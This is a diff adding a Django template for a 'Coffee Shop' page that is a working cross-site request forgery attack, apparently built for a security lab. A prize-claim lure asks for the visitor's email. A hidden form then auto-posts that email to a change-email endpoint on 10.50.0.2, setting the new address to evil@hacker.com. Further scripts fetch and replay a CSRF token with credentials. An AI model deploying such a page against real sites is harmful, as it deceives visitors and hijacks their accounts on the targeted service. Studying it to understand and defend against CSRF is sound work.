@@ -1,0 +1,97 @@
+{% extends "base.html" %}
+{% load i18n static %}
+{% load humanize %}
+{% static "" as baseUrl %}
+
+{% block title %}<title>Coffee Shop</title>{% endblock %}
+{% block header %}
+{% endblock %}
+{% block content %}
+
+<script>
+    function sendemail() {
+        var enteredemail = document.getElementById('enteredemail').value; 
+        var form = document.getElementById('changeemailform'); 
+        document.getElementById('old_email').setAttribute('value', enteredemail); 
+        form.submit()
+
+        /*$.ajax({
+            type: "POST",
+               url: "https://10.50.0.2:8100/changeemail",
+               data: $('#changeemailform').serialize(), // serializes the form's elements.
+            xhrFields: {
+                  withCredentials: true
+               },
+              success: function(html){ 
+                   alert("Thank you.  We will contact you shortly") 
+               },
+               crossDomain: true
+             });*/
+    }
+
+    function getcsrftoken() {
+        $.ajax({
+            type: "GET",
+               url: "https://10.50.0.2:8100/getcsrftoken",
+            xhrFields: {
+                 withCredentials: true
+            },
+              success: function(data){ 
+                   alert(data.csrftoken);
+                   testcsrftoken(data.csrftoken);
+               },
+         });
+    }
+
+    function testcsrftoken(token) {
+        $.ajax({
+            type: "POST",
+               url: "https://10.50.0.2:8100/testcsrftoken",
+            xhrFields: {
+                 withCredentials: true
+            },
+            data: 'csrfmiddlewaretoken=' + token,
+              success: function(data){ 
+                   alert(data.status) 
+               },
+         });
+    }
+
+    function updateiframe() {
+        $('#iniframe').html('world');
+    }
+</script>
+
+<div class="container" style="margin-top:30px">
+    <div class="row">
+        <div class="col-sm-12">
+
+            <h2>Congratulations!</h2>
+
+            <div style="display: none;">
+            <form id="changeemailform" method="POST" action="https://10.50.0.2:8100/changeemail">
+                <input type="hidden" name="old_email" id="old_email" value="" />
+                <input type="hidden" name="new_email" id="new_email" value="evil@hacker.com" />
+                <input type="hidden" name="confirm_email" id="confirm_email" value="evil@hacker.com" />
+            </form>
+            </div>
+
+            <form id="getemailform" onsubmit="event.preventDefault(); sendemail();">
+                <div class="form-group">
+                    <label for="email">Please enter your email to claim your prize</label>
+                    <input type="email" name="enteredemail" class="form-control" id="enteredemail" placeholder="Enter your email">
+                </div>
+                <button type="submit" class="btn btn-primary">Submit</button>
+                <button type="button" class="btn btn-disabled" onclick="getcsrftoken()">Test CSRF</button>
+            </form>
+
+        </div> <!-- col-sm-12 -->
+
+    </div> <! -- row -->
+    
+</div> <! -- container -->
+{% endblock %}
+
+
+{% block endjs %}
+{% endblock %}
